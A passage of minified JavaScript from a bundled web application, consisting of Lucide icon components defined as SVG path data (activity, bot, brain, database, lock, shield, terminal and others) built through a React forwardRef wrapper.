e=kV(a);return e.charAt(0).toUpperCase()+e.slice(1)};var OV={xmlns:"http://www.w3.org/2000/svg",width:24,height:24,viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:2,strokeLinecap:"round",strokeLinejoin:"round"};const UV=a=>{for(const e in a)if(e.startsWith("aria-")||e==="role"||e==="title")return!0;return!1};const zV=U.forwardRef(({color:a="currentColor",size:e=24,strokeWidth:t=2,absoluteStrokeWidth:n,className:i="",children:r,iconNode:l,...u},d)=>U.createElement("svg",{ref:d,...OV,width:e,height:e,stroke:a,strokeWidth:n?Number(t)*24/Number(e):t,className:vD("lucide",i),...!r&&!UV(u)&&{"aria-hidden":"true"},...u},[...l.map(([p,f])=>U.createElement(p,f)),...Array.isArray(r)?r:[r]]));const Le=(a,e)=>{const t=U.forwardRef(({className:n,...i},r)=>U.createElement(zV,{ref:r,iconNode:e,className:vD(`lucide-${qV(uP(a))}`,`lucide-${a}`,n),...i}));return t.displayName=uP(a),t};const BV=[["path",{d:"M22 12h-2.48a2 2 0 0 0-1.93 1.46l-2.35 8.36a.25.25 0 0 1-.48 0L9.24 2.18a.25.25 0 0 0-.48 0l-2.35 8.36A2 2 0 0 1 4.49 12H2",key:"169zse"}]],Br=Le("activity",BV);const FV=[["rect",{x:"2",y:"4",width:"20",height:"16",rx:"2",key:"izxlao"}],["path",{d:"M10 4v4",key:"pp8u80"}],["path",{d:"M2 8h20",key:"d11cs7"}],["path",{d:"M6 4v4",key:"1svtjw"}]],yD=Le("app-window",FV);const VV=[["rect",{x:"14",y:"14",width:"4",height:"6",rx:"2",key:"p02svl"}],["rect",{x:"6",y:"4",width:"4",height:"6",rx:"2",key:"xm4xkj"}],["path",{d:"M6 20h4",key:"1i6q5t"}],["path",{d:"M14 10h4",key:"ru81e7"}],["path",{d:"M6 14h2v6",key:"16z9wg"}],["path",{d:"M14 4h2v6",key:"1idq9u"}]],y0=Le("binary",VV);const HV=[["path",{d:"M4 19.5v-15A2.5 2.5 0 0 1 6.5 2H19a1 1 0 0 1 1 1v18a1 1 0 0 1-1 1H6.5a1 1 0 0 1 0-5H20",key:"k3hazp"}],["path",{d:"m8 13 4-7 4 7",key:"4rari8"}],["path",{d:"M9.1 11h5.7",key:"1gkovt"}]],ED=Le("book-a",HV);const GV=[["path",{d:"M12 7v14",key:"1akyts"}],["path",{d:"M3 18a1 1 0 0 1-1-1V4a1 1 0 0 1 1-1h5a4 4 0 0 1 4 4 4 4 0 0 1 4-4h5a1 1 0 0 1 1 1v13a1 1 0 0 1-1 1h-6a3 3 0 0 0-3 3 3 3 0 0 0-3-3z",key:"ruj8y"}]],QV=Le("book-open",GV);const JV=[["path",{d:"M4 19.5v-15A2.5 2.5 0 0 1 6.5 2H19a1 1 0 0 1 1 1v18a1 1 0 0 1-1 1H6.5a1 1 0 0 1 0-5H20",key:"k3hazp"}]],SD=Le("book",JV);const WV=[["path",{d:"M12 8V4H8",key:"hb8ula"}],["rect",{width:"16",height:"12",x:"4",y:"8",rx:"2",key:"enze0r"}],["path",{d:"M2 14h2",key:"vft8re"}],["path",{d:"M20 14h2",key:"4cs60a"}],["path",{d:"M15 13v2",key:"1xurst"}],["path",{d:"M9 13v2",key:"rq6x2g"}]],KV=Le("bot",WV);const YV=[["path",{d:"M21 8a2 2 0 0 0-1-1.73l-7-4a2 2 0 0 0-2 0l-7 4A2 2 0 0 0 3 8v8a2 2 0 0 0 1 1.73l7 4a2 2 0 0 0 2 0l7-4A2 2 0 0 0 21 16Z",key:"hh9hay"}],["path",{d:"m3.3 7 8.7 5 8.7-5",key:"g66t2b"}],["path",{d:"M12 22V12",key:"d0xqtd"}]],_s=Le("box",YV);const $V=[["path",{d:"M12 18V5",key:"adv99a"}],["path",{d:"M15 13a4.17 4.17 0 0 1-3-4 4.17 4.17 0 0 1-3 4",key:"1e3is1"}],["path",{d:"M17.598 6.5A3 3 0 1 0 12 5a3 3 0 1 0-5.598 1.5",key:"1gqd8o"}],["path",{d:"M17.997 5.125a4 4 0 0 1 2.526 5.77",key:"iwvgf7"}],["path",{d:"M18 18a4 4 0 0 0 2-7.464",key:"efp6ie"}],["path",{d:"M19.967 17.483A4 4 0 1 1 12 18a4 4 0 1 1-7.967-.517",key:"1gq6am"}],["path",{d:"M6 18a4 4 0 0 1-2-7.464",key:"k1g0md"}],["path",{d:"M6.003 5.125a4 4 0 0 0-2.526 5.77",key:"q97ue3"}]],XV=Le("brain",$V);const ZV=[["path",{d:"M16 20V4a2 2 0 0 0-2-2h-4a2 2 0 0 0-2 2v16",key:"jecpp"}],["rect",{width:"20",height:"14",x:"2",y:"6",rx:"2",key:"i6l2r4"}]],e9=Le("briefcase",ZV);const a9=[["rect",{width:"16",height:"20",x:"4",y:"2",rx:"2",key:"1nb95v"}],["line",{x1:"8",x2:"16",y1:"6",y2:"6",key:"x4nwl0"}],["line",{x1:"16",x2:"16",y1:"14",y2:"18",key:"wjye3r"}],["path",{d:"M16 10h.01",key:"1m94wz"}],["path",{d:"M12 10h.01",key:"1nrarc"}],["path",{d:"M8 10h.01",key:"19clt8"}],["path",{d:"M12 14h.01",key:"1etili"}],["path",{d:"M8 14h.01",key:"6423bh"}],["path",{d:"M12 18h.01",key:"mhygvu"}],["path",{d:"M8 18h.01",key:"lrp35t"}]],t9=Le("calculator",a9);const n9=[["path",{d:"m9 18 6-6-6-6",key:"mthhwq"}]],dP=Le("chevron-right",n9);const i9=[["path",{d:"M10.88 21.94 15.46 14",key:"xkve6t"}],["path",{d:"M21.17 8H12",key:"19dcdn"}],["path",{d:"M3.95 6.06 8.54 14",key:"g8jz9m"}],["circle",{cx:"12",cy:"12",r:"10",key:"1mglay"}],["circle",{cx:"12",cy:"12",r:"4",key:"4exip2"}]],CD=Le("chromium",i9);const o9=[["path",{d:"M21.801 10A10 10 0 1 1 17 3.335",key:"yps3ct"}],["path",{d:"m9 11 3 3L22 4",key:"1pflzl"}]],Ys=Le("circle-check-big",o9);const s9=[["circle",{cx:"12",cy:"12",r:"10",key:"1mglay"}],["path",{d:"M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3",key:"1u773s"}],["path",{d:"M12 17h.01",key:"p32p05"}]],r9=Le("circle-question-mark",s9);const l9=[["circle",{cx:"12",cy:"12",r:"10",key:"1mglay"}],["path",{d:"m15 9-6 6",key:"1uzhvr"}],["path",{d:"m9 9 6 6",key:"z0biqf"}]],c9=Le("circle-x",l9);const u9=[["rect",{width:"8",height:"4",x:"8",y:"2",rx:"1",ry:"1",key:"tgr4d6"}],["path",{d:"M8 4H6a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2v-2",key:"4jdomd"}],["path",{d:"M16 4h2a2 2 0 0 1 2 2v4",key:"3hqy98"}],["path",{d:"M21 14H11",key:"1bme5i"}],["path",{d:"m15 10-4 4 4 4",key:"5dvupr"}]],d9=Le("clipboard-copy",u9);const p9=[["rect",{width:"8",height:"4",x:"8",y:"2",rx:"1",ry:"1",key:"tgr4d6"}],["path",{d:"M16 4h2a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2V6a2 2 0 0 1 2-2h2",key:"116196"}],["path",{d:"M12 11h4",key:"1jrz19"}],["path",{d:"M12 16h4",key:"n85exb"}],["path",{d:"M8 11h.01",key:"1dfujw"}],["path",{d:"M8 16h.01",key:"18s6g9"}]],m9=Le("clipboard-list",p9);const f9=[["path",{d:"M12 13v8",key:"1l5pq0"}],["path",{d:"M4 14.899A7 7 0 1 1 15.71 8h1.79a4.5 4.5 0 0 1 2.5 8.242",key:"1pljnt"}],["path",{d:"m8 17 4-4 4 4",key:"1quai1"}]],h9=Le("cloud-upload",f9);const g9=[["path",{d:"M17.5 19H9a7 7 0 1 1 6.71-9h1.79a4.5 4.5 0 1 1 0 9Z",key:"p7xjir"}]],b9=Le("cloud",g9);const v9=[["path",{d:"m18 16 4-4-4-4",key:"1inbqp"}],["path",{d:"m6 8-4 4 4 4",key:"15zrgr"}],["path",{d:"m14.5 4-5 16",key:"e7oirm"}]],y9=Le("code-xml",v9);const E9=[["path",{d:"m16 18 6-6-6-6",key:"eg8j8"}],["path",{d:"m8 6-6 6 6 6",key:"ppft3o"}]],TD=Le("code",E9);const S9=[["path",{d:"M22 7.7c0-.6-.4-1.2-.8-1.5l-6.3-3.9a1.72 1.72 0 0 0-1.7 0l-10.3 6c-.5.2-.9.8-.9 1.4v6.6c0 .5.4 1.2.8 1.5l6.3 3.9a1.72 1.72 0 0 0 1.7 0l10.3-6c.5-.3.9-1 .9-1.5Z",key:"1t2lqe"}],["path",{d:"M10 21.9V14L2.1 9.1",key:"o7czzq"}],["path",{d:"m10 14 11.9-6.9",key:"zm5e20"}],["path",{d:"M14 19.8v-8.1",key:"159ecu"}],["path",{d:"M18 17.5V9.4",key:"11uown"}]],xD=Le("container",S9);const C9=[["rect",{width:"14",height:"14",x:"8",y:"8",rx:"2",ry:"2",key:"17jyea"}],["path",{d:"M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2",key:"zix9uf"}]],ay=Le("copy",C9);const T9=[["path",{d:"M12 20v2",key:"1lh1kg"}],["path",{d:"M12 2v2",key:"tus03m"}],["path",{d:"M17 20v2",key:"1rnc9c"}],["path",{d:"M17 2v2",key:"11trls"}],["path",{d:"M2 12h2",key:"1t8f8n"}],["path",{d:"M2 17h2",key:"7oei6x"}],["path",{d:"M2 7h2",key:"asdhe0"}],["path",{d:"M20 12h2",key:"1q8mjw"}],["path",{d:"M20 17h2",key:"1fpfkl"}],["path",{d:"M20 7h2",key:"1o8tra"}],["path",{d:"M7 20v2",key:"4gnj0m"}],["path",{d:"M7 2v2",key:"1i4yhu"}],["rect",{x:"4",y:"4",width:"16",height:"16",rx:"2",key:"1vbyd7"}],["rect",{x:"8",y:"8",width:"8",height:"8",rx:"1",key:"z9xiuo"}]],Jf=Le("cpu",T9);const x9=[["path",{d:"M11.562 3.266a.5.5 0 0 1 .876 0L15.39 8.87a1 1 0 0 0 1.516.294L21.183 5.5a.5.5 0 0 1 .798.519l-2.834 10.246a1 1 0 0 1-.956.734H5.81a1 1 0 0 1-.957-.734L2.02 6.02a.5.5 0 0 1 .798-.519l4.276 3.664a1 1 0 0 0 1.516-.294z",key:"1vdc57"}],["path",{d:"M5 21h14",key:"11awu3"}]],A9=Le("crown",x9);const P9=[["ellipse",{cx:"12",cy:"5",rx:"9",ry:"3",key:"msslwz"}],["path",{d:"M3 5V19A9 3 0 0 0 21 19V5",key:"1wlel7"}],["path",{d:"M3 12A9 3 0 0 0 21 12",key:"mv7ke4"}]],wp=Le("database",P9);const L9=[["path",{d:"M12 15V3",key:"m9g1x1"}],["path",{d:"M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4",key:"ih7n3h"}],["path",{d:"m7 10 5 5 5-5",key:"brsn70"}]],R9=Le("download",L9);const I9=[["path",{d:"M15 3h6v6",key:"1q9fwt"}],["path",{d:"M10 14 21 3",key:"gplh6r"}],["path",{d:"M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6",key:"a6xqqp"}]],w9=Le("external-link",I9);const j9=[["path",{d:"M18 2h-3a5 5 0 0 0-5 5v3H7v4h3v8h4v-8h3l1-4h-4V7a1 1 0 0 1 1-1h3z",key:"1jg4f8"}]],AD=Le("facebook",j9);const D9=[["path",{d:"M6 22a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h8a2.4 2.4 0 0 1 1.704.706l3.588 3.588A2.4 2.4 0 0 1 20 8v12a2 2 0 0 1-2 2z",key:"1oefj6"}],["path",{d:"M14 2v5a1 1 0 0 0 1 1h5",key:"wfsgrz"}],["path",{d:"M10 12.5 8 15l2 2.5",key:"1tg20x"}],["path",{d:"m14 12.5 2 2.5-2 2.5",key:"yinavb"}]],jp=Le("file-code",D9);const M9=[["path",{d:"M6 22a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h8a2.4 2.4 0 0 1 1.704.706l3.588 3.588A2.4 2.4 0 0 1 20 8v12a2 2 0 0 1-2 2z",key:"1oefj6"}],["path",{d:"M14 2v5a1 1 0 0 0 1 1h5",key:"wfsgrz"}],["path",{d:"M10 9H8",key:"b1mrlr"}],["path",{d:"M16 13H8",key:"t4e002"}],["path",{d:"M16 17H8",key:"z1uh3a"}]],N9=Le("file-text",M9);const _9=[["path",{d:"M10 20a1 1 0 0 0 .553.895l2 1A1 1 0 0 0 14 21v-7a2 2 0 0 1 .517-1.341L21.74 4.67A1 1 0 0 0 21 3H3a1 1 0 0 0-.742 1.67l7.225 7.989A2 2 0 0 1 10 14z",key:"sc7q7i"}]],q9=Le("funnel",_9);const k9=[["path",{d:"M15 6a9 9 0 0 0-9 9V3",key:"1cii5b"}],["circle",{cx:"18",cy:"6",r:"3",key:"1h7g24"}],["circle",{cx:"6",cy:"18",r:"3",key:"fqmcym"}]],PD=Le("git-branch",k9);const O9=[["path",{d:"M15 22v-4a4.8 4.8 0 0 0-1-3.5c3 0 6-2 6-5.5.08-1.25-.27-2.48-1-3.5.28-1.15.28-2.35 0-3.5 0 0-1 0-3 1.5-2.64-.5-5.36-.5-8 0C6 2 5 2 5 2c-.3 1.15-.3 2.35 0 3.5A5.403 5.403 0 0 0 4 9c0 3.5 3 5.5 6 5.5-.39.49-.68 1.05-.85 1.65-.17.6-.22 1.23-.15 1.85v4",key:"tonef"}],["path",{d:"M9 18c-4.51 2-5-2-7-2",key:"9comsn"}]],LD=Le("github",O9);const U9=[["circle",{cx:"12",cy:"12",r:"10",key:"1mglay"}],["path",{d:"M12 2a14.5 14.5 0 0 0 0 20 14.5 14.5 0 0 0 0-20",key:"13o1zl"}],["path",{d:"M2 12h20",key:"9i4pu4"}]],Us=Le("globe",U9);const z9=[["rect",{width:"18",height:"18",x:"3",y:"3",rx:"2",key:"afitv7"}],["path",{d:"M3 9h18",key:"1pudct"}],["path",{d:"M3 15h18",key:"5xshup"}],["path",{d:"M9 3v18",key:"fh3hqa"}],["path",{d:"M15 3v18",key:"14nvp0"}]],_o=Le("grid-3x3",z9);const B9=[["path",{d:"M10 16h.01",key:"1bzywj"}],["path",{d:"M2.212 11.577a2 2 0 0 0-.212.896V18a2 2 0 0 0 2 2h16a2 2 0 0 0 2-2v-5.527a2 2 0 0 0-.212-.896L18.55 5.11A2 2 0 0 0 16.76 4H7.24a2 2 0 0 0-1.79 1.11z",key:"18tbho"}],["path",{d:"M21.946 12.013H2.054",key:"zqlbp7"}],["path",{d:"M6 16h.01",key:"1pmjb7"}]],F9=Le("hard-drive",B9);const V9=[["line",{x1:"4",x2:"20",y1:"9",y2:"9",key:"4lhtct"}],["line",{x1:"4",x2:"20",y1:"15",y2:"15",key:"vyu0kd"}],["line",{x1:"10",x2:"8",y1:"3",y2:"21",key:"1ggp8o"}],["line",{x1:"16",x2:"14",y1:"3",y2:"21",key:"weycgp"}]],H9=Le("hash",V9);const G9=[["path",{d:"M2 9.5a5.5 5.5 0 0 1 9.591-3.676.56.56 0 0 0 .818 0A5.49 5.49 0 0 1 22 9.5c0 2.29-1.5 4-3 5.5l-5.492 5.313a2 2 0 0 1-3 .019L5 15c-1.5-1.5-3-3.2-3-5.5",key:"mvr1a0"}]],E0=Le("heart",G9);const Q9=[["circle",{cx:"12",cy:"12",r:"10",key:"1mglay"}],["path",{d:"M12 16v-4",key:"1dtifu"}],["path",{d:"M12 8h.01",key:"e9boi3"}]],RD=Le("info",Q9);const J9=[["path",{d:"M6 16c5 0 7-8 12-8a4 4 0 0 1 0 8c-5 0-7-8-12-8a4 4 0 1 0 0 8",key:"18ogeb"}]],ID=Le("infinity",J9);const W9=[["path",{d:"m15.5 7.5 2.3 2.3a1 1 0 0 0 1.4 0l2.1-2.1a1 1 0 0 0 0-1.4L19 4",key:"g0fldk"}],["path",{d:"m21 2-9.6 9.6",key:"1j0ho8"}],["circle",{cx:"7.5",cy:"15.5",r:"5.5",key:"yqb3hr"}]],K9=Le("key",W9);const Y9=[["path",{d:"m5 8 6 6",key:"1wu5hv"}],["path",{d:"m4 14 6-6 2-3",key:"1k1g8d"}],["path",{d:"M2 5h12",key:"or177f"}],["path",{d:"M7 2h1",key:"1t2jsx"}],["path",{d:"m22 22-5-10-5 10",key:"don7ne"}],["path",{d:"M14 18h6",key:"1m8k6r"}]],$9=Le("languages",Y9);const X9=[["path",{d:"M12.83 2.18a2 2 0 0 0-1.66 0L2.6 6.08a1 1 0 0 0 0 1.83l8.58 3.91a2 2 0 0 0 1.66 0l8.58-3.9a1 1 0 0 0 0-1.83z",key:"zw3jo"}],["path",{d:"M2 12a1 1 0 0 0 .58.91l8.6 3.91a2 2 0 0 0 1.65 0l8.58-3.9A1 1 0 0 0 22 12",key:"1wduqc"}],["path",{d:"M2 17a1 1 0 0 0 .58.91l8.6 3.91a2 2 0 0 0 1.65 0l8.58-3.9A1 1 0 0 0 22 17",key:"kqbvx6"}]],Zr=Le("layers",X9);const Z9=[["rect",{width:"7",height:"7",x:"3",y:"3",rx:"1",key:"1g98yp"}],["rect",{width:"7",height:"7",x:"14",y:"3",rx:"1",key:"6d4xhi"}],["rect",{width:"7",height:"7",x:"14",y:"14",rx:"1",key:"nxv5o0"}],["rect",{width:"7",height:"7",x:"3",y:"14",rx:"1",key:"1bb6yr"}]],eH=Le("layout-grid",Z9);const aH=[["path",{d:"M15 14c.2-1 .7-1.7 1.5-2.5 1-.9 1.5-2.2 1.5-3.5A6 6 0 0 0 6 8c0 1 .2 2.2 1.5 3.5.7.7 1.3 1.5 1.5 2.5",key:"1gvzjb"}],["path",{d:"M9 18h6",key:"x1upvd"}],["path",{d:"M10 22h4",key:"ceow96"}]],pP=Le("lightbulb",aH);const tH=[["path",{d:"M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71",key:"1cjeqo"}],["path",{d:"M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71",key:"19qd67"}]],nH=Le("link",tH);const iH=[["rect",{width:"18",height:"11",x:"3",y:"11",rx:"2",ry:"2",key:"1w4ew1"}],["path",{d:"M7 11V7a5 5 0 0 1 9.9-1",key:"1mm8w8"}]],oH=Le("lock-open",iH);const sH=[["rect",{width:"18",height:"11",x:"3",y:"11",rx:"2",ry:"2",key:"1w4ew1"}],["path",{d:"M7 11V7a5 5 0 0 1 10 0v4",key:"fwvmzm"}]],_c=Le("lock",sH);const rH=[["path",{d:"m16 17 5-5-5-5",key:"1bji2h"}],["path",{d:"M21 12H9",key:"dn1m92"}],["path",{d:"M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4",key:"1uf3rs"}]],lH=Le("log-out",rH);const cH=[["path",{d:"M8 3H5a2 2 0 0 0-2 2v3",key:"1dcmit"}],["path",{d:"M21 8V5a2 2 0 0 0-2-2h-3",key:"1e4gt3"}],["path",{d:"M3 16v3a2 2 0 0 0 2 2h3",key:"wsl5sc"}],["path",{d:"M16 21h3a2 2 0 0 0 2-2v-3",key:"18trek"}]],uH=Le("maximize",cH);const dH=[["path",{d:"M4 5h16",key:"1tepv9"}],["path",{d:"M4 12h16",key:"1lakjw"}],["path",{d:"M4 19h16",key:"1djgab"}]],pH=Le("menu",dH);const mH=[["path",{d:"M22 17a2 2 0 0 1-2 2H6.828a2 2 0 0 0-1.414.586l-2.202 2.202A.71.71 0 0 1 2 21.286V5a2 2 0 0 1 2-2h16a2 2 0 0 1 2 2z",key:"18887p"}]],fH=Le("message-square",mH);const hH=[["path",{d:"M5 12h14",key:"1ays0h"}]],gH=Le("minus",hH);const bH=[["path",{d:"M8 3v3a2 2 0 0 1-2 2H3",key:"hohbtr"}],["path",{d:"M21 8h-3a2 2 0 0 1-2-2V3",key:"5jw1f3"}],["path",{d:"M3 16h3a2 2 0 0 1 2 2v3",key:"198tvr"}],["path",{d:"M16 21v-3a2 2 0 0 1 2-2h3",key:"ph8mxp"}]],vH=Le("minimize",bH);const yH=[["path",{d:"M12 2v20",key:"t6zp3m"}],["path",{d:"m15 19-3 3-3-3",key:"11eu04"}],["path",{d:"m19 9 3 3-3 3",key:"1mg7y2"}],["path",{d:"M2 12h20",key:"9i4pu4"}],["path",{d:"m5 9-3 3 3 3",key:"j64kie"}],["path",{d:"m9 5 3-3 3 3",key:"l8vdw6"}]],EH=Le("move",yH);const SH=[["rect",{x:"16",y:"16",width:"6",height:"6",rx:"1",key:"4q2zg0"}],["rect",{x:"2",y:"16",width:"6",height:"6",rx:"1",key:"8cvhb9"}],["rect",{x:"9",y:"2",width:"6",height:"6",rx:"1",key:"1egb70"}],["path",{d:"M5 16v-3a1 1 0 0 1 1-1h12a1 1 0 0 1 1 1v3",key:"1jsf9p"}],["path",{d:"M12 12V8",key:"2874zd"}]],wD=Le("network",SH);const CH=[["path",{d:"M11 21.73a2 2 0 0 0 2 0l7-4A2 2 0 0 0 21 16V8a2 2 0 0 0-1-1.73l-7-4a2 2 0 0 0-2 0l-7 4A2 2 0 0 0 3 8v8a2 2 0 0 0 1 1.73z",key:"1a0edw"}],["path",{d:"M12 22V12",key:"d0xqtd"}],["polyline",{points:"3.29 7 12 12 20.71 7",key:"ousv84"}],["path",{d:"m7.5 4.27 9 5.15",key:"1c824w"}]],jD=Le("package",CH);const TH=[["path",{d:"M12 22a1 1 0 0 1 0-20 10 9 0 0 1 10 9 5 5 0 0 1-5 5h-2.25a1.75 1.75 0 0 0-1.4 2.8l.3.4a1.75 1.75 0 0 1-1.4 2.8z",key:"e79jfc"}],["circle",{cx:"13.5",cy:"6.5",r:".5",fill:"currentColor",key:"1okk4w"}],["circle",{cx:"17.5",cy:"10.5",r:".5",fill:"currentColor",key:"f64h9f"}],["circle",{cx:"6.5",cy:"12.5",r:".5",fill:"currentColor",key:"qy21gx"}],["circle",{cx:"8.5",cy:"7.5",r:".5",fill:"currentColor",key:"fotxhn"}]],DD=Le("palette",TH);const xH=[["rect",{width:"18",height:"18",x:"3",y:"3",rx:"2",key:"afitv7"}],["path",{d:"M9 3v18",key:"fh3hqa"}],["path",{d:"m16 15-3-3 3-3",key:"14y99z"}]],AH=Le("panel-left-close",xH);const PH=[["rect",{width:"18",height:"18",x:"3",y:"3",rx:"2",key:"afitv7"}],["path",{d:"M9 3v18",key:"fh3hqa"}],["path",{d:"m14 9 3 3-3 3",key:"8010ee"}]],LH=Le("panel-left-open",PH);const RH=[["rect",{width:"18",height:"18",x:"3",y:"3",rx:"2",key:"afitv7"}],["path",{d:"M3 9h18",key:"1pudct"}],["path",{d:"M9 21V9",key:"1oto5p"}]],xd=Le("panels-top-left",RH);const IH=[["path",{d:"M5 12h14",key:"1ays0h"}],["path",{d:"M12 5v14",key:"s699le"}]],MD=Le("plus",IH);const wH=[["path",{d:"M3 12a9 9 0 0 1 9-9 9.75 9.75 0 0 1 6.74 2.74L21 8",key:"v9h5vc"}],["path",{d:"M21 3v5h-5",key:"1q7to0"}],["path",{d:"M21 12a9 9 0 0 1-9 9 9.75 9.75 0 0 1-6.74-2.74L3 16",key:"3uifl3"}],["path",{d:"M8 16H3v5",key:"1cv678"}]],jH=Le("refresh-cw",wH);const DH=[["path",{d:"M4.5 16.5c-1.5 1.26-2 5-2 5s3.74-.5 5-2c.71-.84.7-2.13-.09-2.91a2.18 2.18 0 0 0-2.91-.09z",key:"m3kijz"}],["path",{d:"m12 15-3-3a22 22 0 0 1 2-3.95A12.88 12.88 0 0 1 22 2c0 2.72-.78 7.5-6 11a22.35 22.35 0 0 1-4 2z",key:"1fmvmk"}],["path",{d:"M9 12H4s.55-3.03 2-4c1.62-1.08 5 0 5 0",key:"1f8sc4"}],["path",{d:"M12 15v5s3.03-.55 4-2c1.08-1.62 0-5 0-5",key:"qeys4"}]],MH=Le("rocket",DH);const NH=[["path",{d:"m21 21-4.34-4.34",key:"14j7rj"}],["circle",{cx:"11",cy:"11",r:"8",key:"4ej97u"}]],Dp=Le("search",NH);const _H=[["rect",{width:"20",height:"8",x:"2",y:"2",rx:"2",ry:"2",key:"ngkwjq"}],["rect",{width:"20",height:"8",x:"2",y:"14",rx:"2",ry:"2",key:"iecqi9"}],["line",{x1:"6",x2:"6.01",y1:"6",y2:"6",key:"16zg32"}],["line",{x1:"6",x2:"6.01",y1:"18",y2:"18",key:"nzw8ys"}]],pc=Le("server",_H);const qH=[["path",{d:"M9.671 4.136a2.34 2.34 0 0 1 4.659 0 2.34 2.34 0 0 0 3.319 1.915 2.34 2.34 0 0 1 2.33 4.033 2.34 2.34 0 0 0 0 3.831 2.34 2.34 0 0 1-2.33 4.033 2.34 2.34 0 0 0-3.319 1.915 2.34 2.34 0 0 1-4.659 0 2.34 2.34 0 0 0-3.32-1.915 2.34 2.34 0 0 1-2.33-4.033 2.34 2.34 0 0 0 0-3.831A2.34 2.34 0 0 1 6.35 6.051a2.34 2.34 0 0 0 3.319-1.915",key:"1i5ecw"}],["circle",{cx:"12",cy:"12",r:"3",key:"1v7zrd"}]],kH=Le("settings",qH);const OH=[["path",{d:"M20 13c0 5-3.5 7.5-7.66 8.95a1 1 0 0 1-.67-.01C7.5 20.5 4 18 4 13V6a1 1 0 0 1 1-1c2 0 4.5-1.2 6.24-2.72a1.17 1.17 0 0 1 1.52 0C14.51 3.81 17 5 19 5a1 1 0 0 1 1 1z",key:"oel41y"}]],Qr=Le("shield",OH);const UH=[["rect",{width:"14",height:"20",x:"5",y:"2",rx:"2",ry:"2",key:"1yt0o3"}],["path",{d:"M12 18h.01",key:"mhygvu"}]],ND=Le("smartphone",UH);const zH=[["path",{d:"M11.017 2.814a1 1 0 0 1 1.966 0l1.051 5.558a2 2 0 0 0 1.594 1.594l5.558 1.051a1 1 0 0 1 0 1.966l-5.558 1.051a2 2 0 0 0-1.594 1.594l-1.051 5.558a1 1 0 0 1-1.966 0l-1.051-5.558a2 2 0 0 0-1.594-1.594l-5.558-1.051a1 1 0 0 1 0-1.966l5.558-1.051a2 2 0 0 0 1.594-1.594z",key:"1s2grr"}],["path",{d:"M20 2v4",key:"1rf3ol"}],["path",{d:"M22 4h-4",key:"gwowj6"}],["circle",{cx:"4",cy:"20",r:"2",key:"6kqj1y"}]],pg=Le("sparkles",zH);const BH=[["path",{d:"M14 9.536V7a4 4 0 0 1 4-4h1.5a.5.5 0 0 1 .5.5V5a4 4 0 0 1-4 4 4 4 0 0 0-4 4c0 2 1 3 1 5a5 5 0 0 1-1 3",key:"139s4v"}],["path",{d:"M4 9a5 5 0 0 1 8 4 5 5 0 0 1-8-4",key:"1dlkgp"}],["path",{d:"M5 21h14",key:"11awu3"}]],FH=Le("sprout",BH);const VH=[["path",{d:"M4 10c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h4c1.1 0 2 .9 2 2",key:"4i38lg"}],["path",{d:"M10 16c-1.1 0-2-.9-2-2v-4c0-1.1.9-2 2-2h4c1.1 0 2 .9 2 2",key:"mlte4a"}],["rect",{width:"8",height:"8",x:"14",y:"14",rx:"2",key:"1fa9i4"}]],HH=Le("square-stack",VH);const GH=[["path",{d:"M11.525 2.295a.53.53 0 0 1 .95 0l2.31 4.679a2.123 2.123 0 0 0 1.595 1.16l5.166.756a.53.53 0 0 1 .294.904l-3.736 3.638a2.123 2.123 0 0 0-.611 1.878l.882 5.14a.53.53 0 0 1-.771.56l-4.618-2.428a2.122 2.122 0 0 0-1.973 0L6.396 21.01a.53.53 0 0 1-.77-.56l.881-5.139a2.122 2.122 0 0 0-.611-1.879L2.16 9.795a.53.53 0 0 1 .294-.906l5.165-.755a2.122 2.122 0 0 0 1.597-1.16z",key:"r04s7s"}]],S0=Le("star",GH);const QH=[["path",{d:"M12.586 2.586A2 2 0 0 0 11.172 2H4a2 2 0 0 0-2 2v7.172a2 2 0 0 0 .586 1.414l8.704 8.704a2.426 2.426 0 0 0 3.42 0l6.58-6.58a2.426 2.426 0 0 0 0-3.42z",key:"vktsd0"}],["circle",{cx:"7.5",cy:"7.5",r:".5",fill:"currentColor",key:"kqv944"}]],JH=Le("tag",QH);const WH=[["circle",{cx:"12",cy:"12",r:"10",key:"1mglay"}],["circle",{cx:"12",cy:"12",r:"6",key:"1vlfrh"}],["circle",{cx:"12",cy:"12",r:"2",key:"1c9p78"}]],Wf=Le("target",WH);const KH=[["path",{d:"M12 19h8",key:"baeox8"}],["path",{d:"m4 17 6-6-6-6",key:"1yngyt"}]],N1=Le("terminal",KH);const YH=[["path",{d:"M14.5 2v17.5c0 1.4-1.1 2.5-2.5 2.5c-1.4 0-2.5-1.1-2.5-2.5V2",key:"125lnx"}],["path",{d:"M8.5 2h7",key:"csnxdl"}],["path",{d:"M14.5 16h-5",key:"1ox875"}]],_D=Le("test-tube",YH);const $H=[["path",{d:"M10 11v6",key:"nco0om"}],["path",{d:"M14 11v6",key:"outv1u"}],["path",{d:"M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6",key:"miytrc"}],["path",{d:"M3 6h18",key:"d0wm0j"}],["path",{d:"M8 6V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2",key:"e791ji"}]],mP=Le("trash-2",$H);const XH=[["path",{d:"M16 7h6v6",key:"box55l"}],["path",{d:"m22 7-8.5 8.5-5-5L2 17",key:"1t1m79"}]],ZH=Le("trending-up",XH);const e7=[["path",{d:"m21.73 18-8-14a2 2 0 0 0-3.48 0l-8 14A2 2 0 0 0 4 21h16a2 2 0 0 0 1.73-3",key:"wmoenq"}],["path",{d:"M12 9v4",key:"juzpu7"}],["path",{d:"M12 17h.01",key:"p32p05"}]],a7=Le("triangle-alert",e7);const t7=[["path",{d:"M19 